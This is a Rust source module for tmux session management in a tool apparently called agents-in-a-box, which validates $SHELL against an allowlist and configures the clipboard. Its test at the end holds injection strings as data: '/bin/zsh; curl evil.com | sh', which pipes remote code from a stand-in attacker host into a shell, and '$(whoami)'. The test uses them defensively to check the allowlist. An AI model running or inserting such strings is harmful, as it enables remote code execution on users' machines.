// ABOUTME: Tmux session management module for agents-in-a-box
//
// This module provides tmux-based session management as an alternative to
// Docker containers, enabling:
// - Native tmux sessions for Claude Code interactions
// - Live preview of session output in TUI
// - Seamless attach/detach with Ctrl+Q
// - Scroll mode for reviewing session history
// - Lightweight, fast, and responsive interactions

pub mod capture;
pub mod process_detection;
pub mod pty_wrapper;
pub mod session;

use anyhow::Result;
use tokio::process::Command;
use tracing::debug;

/// Known valid shells that we allow for reattach-to-user-namespace.
/// This prevents shell injection attacks via malicious $SHELL values.
const VALID_SHELLS: &[&str] = &[
    "/bin/bash",
    "/bin/zsh",
    "/bin/sh",
    "/bin/fish",
    "/bin/tcsh",
    "/bin/csh",
    "/bin/dash",
    "/bin/ksh",
    "/usr/bin/bash",
    "/usr/bin/zsh",
    "/usr/bin/sh",
    "/usr/bin/fish",
    "/usr/local/bin/bash",
    "/usr/local/bin/zsh",
    "/usr/local/bin/fish",
    "/opt/homebrew/bin/bash",
    "/opt/homebrew/bin/zsh",
    "/opt/homebrew/bin/fish",
];

/// Check if reattach-to-user-namespace is available (macOS only).
/// This tool restores access to the macOS user namespace (audio, clipboard, etc.) in tmux.
///
/// Uses direct execution test rather than `which` for reliability.
#[cfg(target_os = "macos")]
pub async fn has_reattach_to_user_namespace() -> bool {
    // Try to run the command with a simple echo - this verifies it actually works
    Command::new("reattach-to-user-namespace")
        .args(["echo", "test"])
        .output()
        .await
        .map(|o| o.status.success())
        .unwrap_or(false)
}

/// Non-macOS: reattach-to-user-namespace is not needed.
#[cfg(not(target_os = "macos"))]
pub async fn has_reattach_to_user_namespace() -> bool {
    false
}

/// Get a validated shell path for use with reattach-to-user-namespace.
/// Returns None if $SHELL is not in the allowed list (security measure).
#[cfg(target_os = "macos")]
fn get_validated_shell() -> Option<String> {
    let shell = std::env::var("SHELL").ok()?;

    // Check if the shell is in our allowed list
    if VALID_SHELLS.contains(&shell.as_str()) {
        return Some(shell);
    }

    // Also allow if it ends with a known shell name and exists
    let shell_name = std::path::Path::new(&shell)
        .file_name()
        .and_then(|n| n.to_str())?;

    if ["bash", "zsh", "sh", "fish", "tcsh", "csh", "dash", "ksh"].contains(&shell_name) {
        // Verify the path exists and is executable
        if std::path::Path::new(&shell).exists() {
            return Some(shell);
        }
    }

    tracing::warn!(
        "Shell '{}' not in allowed list, falling back to /bin/zsh",
        shell
    );
    Some("/bin/zsh".to_string())
}

/// Configure a tmux session to use reattach-to-user-namespace on macOS.
/// This enables audio (say command), clipboard (pbcopy/pbpaste), and other
/// user namespace features within tmux sessions.
///
/// # Arguments
/// * `session_name` - The tmux session name to configure
///
/// # Returns
/// * `Ok(true)` - Configuration was applied successfully
/// * `Ok(false)` - reattach-to-user-namespace not available (graceful degradation)
/// * `Err(_)` - Failed to apply configuration
#[cfg(target_os = "macos")]
pub async fn configure_macos_user_namespace(session_name: &str) -> anyhow::Result<bool> {
    // Check if the tool is available
    if !has_reattach_to_user_namespace().await {
        tracing::debug!(
            "reattach-to-user-namespace not installed, skipping macOS user namespace config for session: {}",
            session_name
        );
        return Ok(false);
    }

    // Get validated shell (prevents injection attacks)
    let shell = match get_validated_shell() {
        Some(s) => s,
        None => {
            tracing::warn!(
                "Could not determine valid shell, skipping user namespace config for session: {}",
                session_name
            );
            return Ok(false);
        }
    };

    let default_cmd = format!("reattach-to-user-namespace -l {}", shell);

    // Apply the configuration
    let output = Command::new("tmux")
        .args([
            "set-option",
            "-t",
            session_name,
            "default-command",
            &default_cmd,
        ])
        .output()
        .await?;

    if output.status.success() {
        tracing::info!(
            "Configured reattach-to-user-namespace for session: {} (shell: {})",
            session_name,
            shell
        );
        Ok(true)
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        tracing::warn!(
            "Failed to configure reattach-to-user-namespace for session {}: {}",
            session_name,
            stderr.trim()
        );
        // Return Ok(false) instead of error - graceful degradation
        Ok(false)
    }
}

/// Non-macOS: No-op for user namespace configuration.
#[cfg(not(target_os = "macos"))]
pub async fn configure_macos_user_namespace(_session_name: &str) -> anyhow::Result<bool> {
    Ok(false)
}

/// Configure clipboard integration for a tmux session
///
/// Enables OSC 52 clipboard support and platform-specific copy commands
/// so that copy/paste works with the system clipboard.
pub async fn configure_clipboard(session_name: &str) -> Result<()> {
    debug!("Configuring clipboard for tmux session: {}", session_name);

    // Enable set-clipboard for OSC 52 escape sequence support
    // This allows the terminal to access the system clipboard
    let output = Command::new("tmux")
        .args(["set-option", "-t", session_name, "set-clipboard", "on"])
        .output()
        .await?;

    if !output.status.success() {
        anyhow::bail!(
            "Failed to set tmux option set-clipboard: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }

    // Configure copy-pipe for mouse selection to use system clipboard
    #[cfg(target_os = "macos")]
    {
        bind_clipboard_for_copy_modes(session_name, "pbcopy").await?;
        debug!("Configured macOS clipboard with pbcopy");
    }

    #[cfg(target_os = "linux")]
    {
        // Linux: Try xclip first, then xsel
        let copy_cmd = if which::which("xclip").is_ok() {
            Some("xclip -selection clipboard")
        } else if which::which("xsel").is_ok() {
            Some("xsel --clipboard --input")
        } else {
            None
        };

        if let Some(cmd) = copy_cmd {
            bind_clipboard_for_copy_modes(session_name, cmd).await?;
            debug!("Configured Linux clipboard with: {}", cmd);
        } else {
            debug!("No clipboard tool found on Linux (xclip or xsel)");
        }
    }

    Ok(())
}

/// Bind clipboard copy command for both copy-mode and copy-mode-vi
/// Note: tmux key bindings are global, not session-specific
#[cfg(any(target_os = "macos", target_os = "linux"))]
async fn bind_clipboard_for_copy_modes(_session_name: &str, copy_cmd: &str) -> Result<()> {
    // Bind for both emacs-style (copy-mode) and vi-style (copy-mode-vi) modes
    for mode in ["copy-mode-vi", "copy-mode"] {
        let output = Command::new("tmux")
            .args([
                "bind-key", "-T", mode, "MouseDragEnd1Pane",
                "send-keys", "-X", "copy-pipe-and-cancel", copy_cmd
            ])
            .output()
            .await?;

        if !output.status.success() {
            anyhow::bail!(
                "Failed to bind tmux key for {}: {}",
                mode,
                String::from_utf8_lossy(&output.stderr)
            );
        }
    }

    Ok(())
}

#[allow(unused_imports)]
pub use capture::CaptureOptions;
pub use process_detection::ClaudeProcessDetector;
#[allow(unused_imports)]
pub use pty_wrapper::PtyWrapper;
#[allow(unused_imports)]
pub use session::{AttachState, TmuxSession};

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_valid_shells_are_absolute_paths() {
        for shell in VALID_SHELLS {
            assert!(
                shell.starts_with('/'),
                "Shell {} should be an absolute path",
                shell
            );
        }
    }

    #[test]
    #[cfg(target_os = "macos")]
    fn test_get_validated_shell_rejects_injection() {
        // This test requires temporarily setting SHELL, which isn't safe in parallel tests
        // So we just verify the validation logic exists by checking the constant
        assert!(!VALID_SHELLS.contains(&"/bin/zsh; curl evil.com | sh"));
        assert!(!VALID_SHELLS.contains(&"$(whoami)"));
    }
}
